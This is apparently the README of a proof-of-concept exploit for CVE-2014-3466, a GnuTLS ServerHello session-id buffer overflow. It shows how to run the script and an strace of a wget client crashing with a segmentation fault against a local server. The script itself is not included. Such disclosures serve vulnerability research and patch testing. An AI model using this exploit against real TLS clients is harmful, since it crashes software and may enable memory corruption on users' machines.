## Proof of Concept for CVE-2014-3466 (GnuTLS buffer overflow: session id length check)
### Information
See: https://bugzilla.redhat.com/show_bug.cgi?id=1101932

**This is not a weaponized exploit.**

caveat: this python code really sucks, I pretty much handcrafted the ServerHello and spent only about 5mins on the python part. feel free to improve this exploit as you wish.

### Example
```bash
$ python poc.py
```

with some client linked to a vulnerable version of GnuTLS (e.g. wget on Debian):
```bash
$ strace wget -d https://localhost:4433 --secure-protocol=TLSv1

[...]

recvfrom(4, "\2\0\0\366\3\1S\213\177c\301\16\35r\n\263\370\247\17\365]ieXB\200\301\373O\333\232\252"..., 250, 0, NULL, NULL) = 250
write(2, "GnuTLS: No supported cipher suit"..., 52GnuTLS: No supported cipher suites have been found.
) = 52
) --- SIGSEGV (Segmentation fault) @ 0 (0) ---
) +++ killed by SIGSEGV +++
) Segmentation fault
```

No time to test this further at the moment, enjoy.
